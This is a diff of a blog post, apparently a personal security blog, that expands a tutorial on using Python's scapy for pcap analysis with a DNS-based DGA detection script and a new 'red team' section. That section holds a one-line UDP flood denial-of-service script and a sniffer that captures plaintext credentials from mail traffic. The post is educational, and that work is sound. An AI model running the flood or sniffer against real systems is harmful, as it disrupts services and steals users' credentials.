@@ -5,7 +5,7 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="noindex, nofollow">
-<title>scapy for pcap parsing | Journal of Connar</title>
+<title>Exploring scapy for blue and red team operations | Journal of Connar</title>
 <meta name="keywords" content="pcap, scapy">
 <meta name="description" content="Intro
 In this post we will explore the scapy library in python and its features when it comes to analyzing pcap files. In general, scapy library can be used for both red team (sniffing traffic) and blue team operations (analyzing pcap files). We will stick to the second one for this post.
@@ -144,9 +144,9 @@ I learned about scapy back when I started playing CTF challenges and was trying 
   <header class="post-header">
     <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
-      scapy for pcap parsing
+      Exploring scapy for blue and red team operations
     </h1>
-    <div class="post-meta">13 min&nbsp;·&nbsp;connar
+    <div class="post-meta">16 min&nbsp;·&nbsp;connar
 
 </div>
   </header> <div class="toc">
@@ -167,12 +167,22 @@ I learned about scapy back when I started playing CTF challenges and was trying 
                     <a href="#getting-the-checksum-value-of-a-packet" aria-label="Getting the checksum value of a packet">Getting the checksum value of a packet</a></li></ul>
                 </li>
                 <li>
-                    <a href="#examples" aria-label="Examples">Examples</a><ul>
+                    <a href="#examples-blue-team" aria-label="Examples [blue team]">Examples [blue team]</a><ul>
                         
                 <li>
                     <a href="#example-1-exfiltration-via-port-number---nixu-challenge" aria-label="Example 1: Exfiltration via port number - NIXU Challenge">Example 1: Exfiltration via port number - NIXU Challenge</a></li>
                 <li>
-                    <a href="#example-2-exfiltration-via-icmp-ping" aria-label="Example 2: Exfiltration via ICMP ping">Example 2: Exfiltration via ICMP ping</a></li></ul>
+                    <a href="#example-2-exfiltration-via-icmp-ping" aria-label="Example 2: Exfiltration via ICMP ping">Example 2: Exfiltration via ICMP ping</a></li>
+                <li>
+                    <a href="#example-3-detecting-suspicious-ip-addresses" aria-label="Example 3: Detecting suspicious IP addresses">Example 3: Detecting suspicious IP addresses</a></li></ul>
+                </li>
+                <li>
+                    <a href="#examples-red-team" aria-label="Examples [red team]">Examples [red team]</a><ul>
+                        
+                <li>
+                    <a href="#example-1-udp-flood-for-dos" aria-label="Example 1: UDP flood for DoS">Example 1: UDP flood for DoS</a></li>
+                <li>
+                    <a href="#example-2-sniffing-traffic-to-steal-plaintext-credentials" aria-label="Example 2: Sniffing traffic to steal plaintext credentials">Example 2: Sniffing traffic to steal plaintext credentials</a></li></ul>
                 </li>
                 <li>
                     <a href="#summary" aria-label="Summary">Summary</a>
@@ -342,7 +352,7 @@ Since the chksum exists inside <code>TCP</code>, let&rsquo;s get the <code>TCP</
 </span></span><span style="display:flex;"><span>Packet No<span style="color:#ae81ff">.5</span> has chksum <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2b0a</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
-</span></span></code></pre></div><h2 id="examples">Examples<a hidden class="anchor" aria-hidden="true" href="#examples">#</a></h2>
+</span></span></code></pre></div><h2 id="examples-blue-team">Examples [blue team]<a hidden class="anchor" aria-hidden="true" href="#examples-blue-team">#</a></h2>
 <p>Let&rsquo;s see some relevant examples where we would need to get the same field from each packet.</p>
 <h3 id="example-1-exfiltration-via-port-number---nixu-challenge">Example 1: Exfiltration via port number - NIXU Challenge<a hidden class="anchor" aria-hidden="true" href="#example-1-exfiltration-via-port-number---nixu-challenge">#</a></h3>
 <p>This is a very nice challenge to showcase examples where we might need to get a specific field from all packets. In the <code>ports</code> challenge from <code>the nixu challenge</code> this is exactly what&rsquo;s going on: Data have been exfiltrated through the destination port number.</p>
@@ -451,10 +461,75 @@ To avoid the repetition of the data and get only the first occurance of them, we
 </span></span></code></pre></div><p>Running our script, we indeed get back the reconstructed zip file:</p>
 <p><img loading="lazy" src="/posts/scapy/oldest_trick5.png" alt="oldest trick5"  />
 </p>
+<h3 id="example-3-detecting-suspicious-ip-addresses">Example 3: Detecting suspicious IP addresses<a hidden class="anchor" aria-hidden="true" href="#example-3-detecting-suspicious-ip-addresses">#</a></h3>
+<p>In this and final example, we will see an overview of how we could identify a suspicious IP address that tries to DoS a website, or a possible C2 server communicating with a victim machine.<br>
+The presented code is taken from the <a href="https://cylab.be/blog/245/network-traffic-analysis-with-python-scapy-and-some-machine-learning">Cyber Defense Lab of the Royal Military Academy in Belgium blog</a>, so for further information related to the example you can read this blog:)</p>
+<p>According to this blog, the following part of code using scapy is very similar to the approach of how a SIEM software would create alerts.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>packets <span style="color:#f92672">=</span> PcapReader(<span style="color:#e6db74">&#34;capture.pcap&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>counts <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># QR = Query Response</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ANCOUNT = Answer Count</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://datatracker.ietf.org/doc/html/rfc5395#section-2</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> packet <span style="color:#f92672">in</span> packets:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> packet<span style="color:#f92672">.</span>haslayer(DNS) <span style="color:#f92672">and</span> packet[DNS]<span style="color:#f92672">.</span>qr <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> packet[DNS]<span style="color:#f92672">.</span>ancount <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># DNS query returned no answer</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># extract the destination IP (device that sent the query)</span>
+</span></span><span style="display:flex;"><span>        ip <span style="color:#f92672">=</span> packet[IP]<span style="color:#f92672">.</span>dst
+</span></span><span style="display:flex;"><span>        counts[ip] <span style="color:#f92672">=</span> counts<span style="color:#f92672">.</span>get(ip, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>threshold <span style="color:#f92672">=</span> <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;+ Create list of suspicious IP addresses ...&#34;</span>)
+</span></span><span style="display:flex;"><span>suspicious <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ip, occurrences <span style="color:#f92672">in</span> counts<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> occurrences <span style="color:#f92672">&lt;</span> threshold:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>    suspicious<span style="color:#f92672">.</span>append(ip)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(suspicious)
+</span></span></code></pre></div><p>This code sample was made for detecting DGA malware, a malware that would receive a lot of DNS replies (<code>packet[DNS].qr == 1</code>) with no answer (<code>packet[DNS].ancount == 0</code>).</p>
+<p>So the purpose of the script would be to create a dictionary of IP addresses found in the pcap file and identify such IP addresses that would generate the DNS traffic.<br>
+Here, the threshold is 100 and it probably would create a lot of false positives depending on the victim&rsquo;s network (i.e. for a coorporate network we would have a lot of false positives with that threshold).  The blog goes through details of how you could use statistics to find the threshold value in a sensible way.</p>
+<h2 id="examples-red-team">Examples [red team]<a hidden class="anchor" aria-hidden="true" href="#examples-red-team">#</a></h2>
+<p>Beside using scapy to solve a CTF challenge or maybe create a SIEM type of software, scapy can be also used for neferious purposes.</p>
+<h3 id="example-1-udp-flood-for-dos">Example 1: UDP flood for DoS<a hidden class="anchor" aria-hidden="true" href="#example-1-udp-flood-for-dos">#</a></h3>
+<p>An example of using scapy for flooding a target IP with UDP packets, which as a result causes the system to process these packets rather than legitimate ones (resulting in a Dos), is the following simple PoC script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>send(IP(dst<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;some_target_IP&#34;</span>)<span style="color:#f92672">/</span>fuzz(UDP()),loop<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><p>Using the <code>fuzz(UDP())</code> function, the script generates random variations of UDP packets, and since it also uses <code>loop=1</code> which makes the script run continuously, it overwhelms the target machine resulting in a Dos.</p>
+<h3 id="example-2-sniffing-traffic-to-steal-plaintext-credentials">Example 2: Sniffing traffic to steal plaintext credentials<a hidden class="anchor" aria-hidden="true" href="#example-2-sniffing-traffic-to-steal-plaintext-credentials">#</a></h3>
+<p>Another cool example of using scapy for malicious purposes is the one where you could make a sniffer and try to find plaintext credentials in TCP packets:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> sniff, TCP, IP
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">packet_callback</span>(packet):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> packet[TCP]<span style="color:#f92672">.</span>payload:
+</span></span><span style="display:flex;"><span>        mypacket <span style="color:#f92672">=</span> str(packet[TCP]<span style="color:#f92672">.</span>payload)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;user&#39;</span> <span style="color:#f92672">in</span> mypacket<span style="color:#f92672">.</span>lower() <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;pass&#39;</span> <span style="color:#f92672">in</span> mypacket<span style="color:#f92672">.</span>lower():
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Destination: </span><span style="color:#e6db74">{</span>packet[IP]<span style="color:#f92672">.</span>dst<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] </span><span style="color:#e6db74">{</span>str(packet[TCP]<span style="color:#f92672">.</span>payload)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sniff(filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;tcp port 110 or tcp port 25 or tcp port 143&#39;</span>,prn<span style="color:#f92672">=</span>packet_callback, store<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><p>With this script, a sniffer is set to run continuously, filtering on specific tcp ports and calling the <code>packet_callback</code> function for each new packet.</p>
+<p>If the found packet has some payload (data) inside the TCP layer, then the script checks whether words such as <code>user</code> or <code>pass</code> exist in it, since that would mean potential credentials are being transmitted.</p>
+<p>If all the above are true, the script prints the destination of the packet (where the credentials would be used) but also the credentials themselfs.</p>
 <h2 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
-<p>There are so many attributes that a packet has that it would be such an extensive post to go through all of them. The goal of this post was to simply show how can someone play around with scapy and python&rsquo;s interactive mode in order to easily identify the attribute of interest.</p>
-<p>I hope this post was of some use and that you learned something:)</p>
-
+<p>In this post we did an overview of how scapy can be used for both defensive and offensive purposes, but also for just some fun CTF challenges.<br>
+The attributes that each packet has and how these could be used for all the forementioned purposes are too many and would require a really extensive post, which was not the goal of this post.</p>
+<p>The goal for this post was to get a bit more familiar with scapy and show how to approach a problem by crafting a script part by part with the help of the interactive mode and the various keywords we used in order to find what you are looking for. I hope you had as much fun reading this as I had writing it:)</p>
+<p><strong>References</strong></p>
+<blockquote>
+    <ul>
+        <li> [1] <a href="https://scapy.readthedocs.io/en/latest/">Scapy: <i>Welcome to Scapy's documentation!</i></a></li>
+        <li> [2] <a href="https://cylab.be/blog/245/network-traffic-analysis-with-python-scapy-and-some-machine-learning">Thibault Debatty: <i>Network traffic analysis with Python, Scapy (and some Machine Learning)</i></a></li>
+        <li> [3] <a href="https://github.com/ep4sh/pyddos/tree/master">pyddos: <i>Examples of python SCAPY lib for DDOS (udp, syn flood etc).</i></a></li>
+        <li> [4] <a href="https://medium.com/@MonlesYen/python-for-cybersecurity-30-scapy-351cc6fe9e7a">Yen: <i>Python for Cybersecurity 30 — Scapy</i></a></li>
+</i></a></li>
+    </ul>
+</blockquote>
 
   </div>
 
